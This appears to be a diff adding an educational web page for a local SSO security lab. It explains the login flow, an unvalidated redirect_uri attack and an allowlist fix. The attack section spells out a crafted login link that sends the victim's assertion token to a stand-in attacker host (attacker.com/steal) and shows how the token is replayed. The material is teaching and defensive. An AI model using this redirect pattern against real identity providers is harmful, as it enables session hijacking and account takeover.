@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SSO Lab</title>
+  <link rel="stylesheet" href="/guide.css">
+</head>
+<body>
+  <h1>🔑 Single Sign-On (SSO) — How It Works</h1>
+  <p class="subtitle">One central login (Identity Provider) grants access to multiple apps (Service Providers) without re-entering credentials.</p>
+
+  <div class="flow-box">
+    <div class="section-title">SSO Authentication Flow</div>
+    <pre>ACTORS:
+  User         — wants to access WorkHub
+  WorkHub (SP) — Service Provider at localhost:3064
+  CorpID (IdP) — Identity Provider at localhost:3064/idp/*
+
+1. User visits WorkHub (SP)
+   User                    WorkHub (SP)               CorpID (IdP)
+     │                          │                          │
+     ├── GET / ────────────────→│                          │
+     │                          │ No session found         │
+     │                          ├── Redirect to IdP ──────→│
+     │←── 302 /idp/login ───────┤  ?client_id=workhub     │
+     │    ?redirect_uri=.../callback                       │
+     │    &amp;state=abc123                                    │
+
+2. User logs in at CorpID IdP
+     ├── GET /idp/login ────────────────────────────────→ │
+     │                                                     │ Show CorpID login form
+     │←── 200 + login form ──────────────────────────────┤
+     │
+     ├── POST /idp/authenticate { username, password } ─→ │
+     │                                                     │ Validate credentials
+     │                                                     │ Issue assertion token (JWT, 2 min)
+     │←── 302 /callback?token=eyJ...&amp;state=abc123 ────────┤
+
+3. WorkHub receives assertion
+     ├── GET /callback?token=eyJ...&amp;state=abc123 ────────→│
+     │                                                     │ Verify JWT signature
+     │                                                     │ Create WorkHub session
+     │←── 302 /dashboard + Set-Cookie: wh_session ────────┤</pre>
+  </div>
+
+  <div class="flow-box">
+    <div class="section-title">⚠ Attack: Unvalidated redirect_uri</div>
+    <pre>If the IdP does NOT validate redirect_uri:
+
+  Attacker crafts a link:
+  http://localhost:3064/idp/login
+    ?client_id=workhub-client-id
+    &amp;redirect_uri=http://attacker.com/steal   ← ATTACKER'S server
+    &amp;state=anyvalue
+
+  Victim clicks the link → sees legitimate CorpID login page → enters credentials
+
+  CorpID issues assertion token and redirects to:
+    http://attacker.com/steal?token=eyJhbGciOiJIUzI1NiJ9...
+
+  Attacker receives the assertion token and calls:
+    http://localhost:3064/callback?token=&lt;stolen&gt;&amp;state=anyvalue
+
+  Attacker is now logged in as the victim on WorkHub.</pre>
+  </div>
+
+  <div class="flow-box">
+    <div class="section-title">✅ Fix: Validate redirect_uri Before Redirecting</div>
+    <pre style="color:#cbd5e1;font-size:0.78rem;line-height:1.6">// Registered Service Providers with their allowed redirect URIs
+const ALLOWED_REDIRECT_URIS = {
+  'workhub-client-id': [
+    'http://localhost:3064/callback',
+    'https://workhub.corp.com/callback'
+  ],
+  'helpdesk-client-id': [
+    'http://localhost:3070/callback'
+  ]
+};
+
+app.post('/idp/authenticate', (req, res) => {
+  const { client_id, redirect_uri } = req.body;
+  const allowed = ALLOWED_REDIRECT_URIS[client_id] || [];
+
+  // ✅ Exact match only — no prefix matching, no wildcard
+  if (!allowed.includes(redirect_uri)) {
+    return res.status(400).json({
+      error: 'redirect_uri not allowed',
+      provided: redirect_uri,
+      allowed: allowed
+    });
+  }
+  // ... proceed with authentication
+});</pre>
+    <pre style="margin-top:1rem">Rules for redirect_uri validation:
+  ✅ Exact string match only — no prefix matching
+  ✅ No wildcard subdomains (attacker.evil.workhub.com would match *.workhub.com)
+  ✅ Registered at client registration time — not dynamic
+  ✅ Log rejected redirect_uris as security events</pre>
+  </div>
+
+  <div class="flow-box">
+    <div class="section-title">Service Provider vs Identity Provider</div>
+    <table style="width:100%;border-collapse:collapse;font-size:0.82rem">
+      <tr style="color:#64748b;border-bottom:1px solid #1a3a1a">
+        <th style="text-align:left;padding:0.5rem">Role</th>
+        <th>Service Provider (SP)</th>
+        <th>Identity Provider (IdP)</th>
+      </tr>
+      <tr style="border-bottom:1px solid #0d1f0d">
+        <td style="padding:0.5rem;color:#94a3b8">What it is</td>
+        <td style="padding:0.5rem;color:#94a3b8">The app the user wants to use</td>
+        <td style="padding:0.5rem;color:#94a3b8">The central login service</td>
+      </tr>
+      <tr style="border-bottom:1px solid #0d1f0d">
+        <td style="padding:0.5rem;color:#94a3b8">Stores credentials?</td>
+        <td style="padding:0.5rem;color:#4ade80">No</td>
+        <td style="padding:0.5rem;color:#4ade80">Yes (usernames, passwords, MFA)</td>
+      </tr>
+      <tr style="border-bottom:1px solid #0d1f0d">
+        <td style="padding:0.5rem;color:#94a3b8">Examples</td>
+        <td style="padding:0.5rem;color:#94a3b8">Slack, GitHub, Salesforce, WorkHub</td>
+        <td style="padding:0.5rem;color:#94a3b8">Okta, Azure AD, Google, CorpID</td>
+      </tr>
+      <tr>
+        <td style="padding:0.5rem;color:#94a3b8">Protocols</td>
+        <td colspan="2" style="padding:0.5rem;color:#94a3b8">SAML 2.0 (enterprise), OpenID Connect (modern), CAS (legacy)</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="flow-box">
+    <strong>Test redirect_uri Validation (against hardened port 3066)</strong>
+    <div style="display:flex;gap:0.5rem;flex-wrap:wrap;margin:0.5rem 0">
+      <span style="font-size:0.78rem;color:#64748b">Quick test:</span>
+      <button class="demo-btn" style="font-size:0.75rem;padding:0.2rem 0.5rem"
+        onclick="document.getElementById('redirect-test-input').value='http://localhost:3066/callback'">
+        :3066/callback (registered ✅)
+      </button>
+      <button class="demo-btn" style="font-size:0.75rem;padding:0.2rem 0.5rem"
+        onclick="document.getElementById('redirect-test-input').value='http://localhost:3064/callback'">
+        :3064/callback (cross-demo ✅)
+      </button>
+      <button class="demo-btn" style="font-size:0.75rem;padding:0.2rem 0.5rem"
+        onclick="document.getElementById('redirect-test-input').value='http://attacker.com/steal'">
+        attacker.com (not registered ✗)
+      </button>
+      <button class="demo-btn" style="font-size:0.75rem;padding:0.2rem 0.5rem"
+        onclick="document.getElementById('redirect-test-input').value='http://localhost:3066/callback?x=1'">
+        query param variant ✗
+      </button>
+    </div>
+    <div style="display:flex;gap:0.5rem;align-items:center;flex-wrap:wrap;margin-bottom:0.75rem">
+      <input class="field" id="redirect-test-input" style="flex:1"
+        placeholder="http://localhost:3064/callback">
+      <button class="demo-btn" id="btn-test-redirect">Test</button>
+    </div>
+    <div class="result-banner" id="redirect-result"></div>
+    <pre class="decoded-box" id="redirect-out" style="min-height:60px">–</pre>
+  </div>
+
+  <div class="target-switcher">
+    <button class="btn-vulnerable" id="btn-vuln">Vulnerable SSO (3064)</button>
+    <button class="btn-protected" id="btn-strong">Hardened SSO (3066)</button>
+  </div>
+
+  <script>
+    function showResult(id, type, msg) {
+      var el = document.getElementById(id);
+      el.className = 'result-banner ' + type;
+      el.textContent = msg;
+      el.style.display = 'block';
+    }
+
+    document.getElementById('btn-test-redirect').addEventListener('click', async function() {
+      var uri = document.getElementById('redirect-test-input').value.trim();
+      if (!uri) {
+        showResult('redirect-result', 'failure', '✗ Enter a redirect_uri to test');
+        return;
+      }
+      try {
+        var url = 'http://localhost:3066/idp/validate-redirect?client_id=workhub-client-id&redirect_uri=' + encodeURIComponent(uri);
+        var res = await fetch(url);
+        var data = await res.json();
+        document.getElementById('redirect-out').textContent = JSON.stringify(data, null, 2);
+        showResult('redirect-result', data.allowed ? 'success' : 'failure',
+          data.allowed
+            ? '✅ Allowed: "' + uri + '" is in the registered allowlist for workhub-client-id'
+            : '✗ Rejected: "' + uri + '" — ' + data.reason
+        );
+      } catch(e) {
+        showResult('redirect-result', 'failure', '✗ ' + e.message + ' — is port 3066 running?');
+      }
+    });
+
+    document.getElementById('btn-vuln').addEventListener('click', function() {
+      window.open('http://localhost:3064');
+    });
+    document.getElementById('btn-strong').addEventListener('click', function() {
+      window.open('http://localhost:3066');
+    });
+  </script>
+</body>
+</html>
